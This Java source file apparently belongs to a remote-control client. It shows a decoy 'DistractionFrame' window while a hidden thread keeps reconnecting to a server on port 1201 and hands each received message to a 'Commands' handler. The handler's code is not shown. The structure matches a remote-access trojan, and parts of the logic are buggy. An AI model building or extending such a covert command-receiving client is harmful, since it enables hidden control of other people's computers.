import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.util.*;
import java.util.concurrent.TimeUnit;

import javax.swing.Timer;


public class Client implements ActionListener{


	private String id = "User: ";
	private int port = 1201;
	private String serverName = "127.0.0.1";
	private Talker talk;
	private Timer timer;
	private int reconnect = 1;
	private String message = " I am from user";
	boolean connected = true;


	
	
	public Client() throws Throwable{

		new DistractionFrame();
	
			//Initial Attempt To Connect To Server
		new Thread(new Runnable()
		{
		     public void run()
		     {
		      		String msg;

		    	 while(connected){
		          try {
		        	  
		        	System.out.println("Client: Not Connected Yet"); 
		      		talk = new Talker(serverName, port, id);
		      		connected = false;
		      		System.out.println("Client: Connected");
		      		
		          }
				 catch (Throwable e) {
					
					try {
						Thread.sleep(6000);
					} catch (InterruptedException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
				}
		          
		          }
		    	 ;
		    	 while(true){
		    		 
		    		 try {
						msg = talk.recieve();
						System.out.print("I AM MSG: " + msg);
						new Commands(msg,talk);
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
		    		 
		    		 
		    	 }
		     }
		}).start();
		
		

			

			
	}

@Override
public void actionPerformed(ActionEvent e){

	String cmd;
	cmd = e.getActionCommand();
	
	// for every N minutes attempt to Connect to Server
	if(cmd.equals("Start Timer")){
		boolean connect = false;
		try {
			
			while(!connect){
			connectTalker();
			
			}
			
		} catch (Throwable e1) {
			
			System.out.println("Either already connected or unable to connect");
		}
		
	}
	
	
	
}// end ActionhandleCommands

public void connectTalker() throws Throwable
{
	try
	{
		while(true)
		{
			message = talk.recieve();
			//talk.send(id);
			//new Commands(message);
			
		}
	}
	catch (IOException e) {
		e.printStackTrace();
	}
}

public static void main(String[] args) throws Throwable{
	
	new Client();

	}// end main
	
}// end class